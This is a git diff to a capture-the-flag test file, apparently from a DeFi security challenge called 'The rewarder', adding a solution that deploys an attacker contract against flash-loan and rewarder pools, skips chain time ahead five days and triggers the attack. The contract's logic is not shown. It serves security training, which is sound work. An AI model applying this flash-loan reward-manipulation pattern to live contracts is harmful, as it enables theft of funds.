@@ -66,6 +66,19 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const TheRewarderPoolFactoryAttacker = await ethers.getContractFactory('TheRewarderPoolAttacker', attacker);
+        const AttackerContract = await TheRewarderPoolFactoryAttacker.deploy(
+            this.flashLoanPool.address,
+            this.rewarderPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address
+        );
+
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+
+        // The thing here is not to be late before someone withdraw his reward
+        await AttackerContract.attack();
     });
 
     after(async function () {
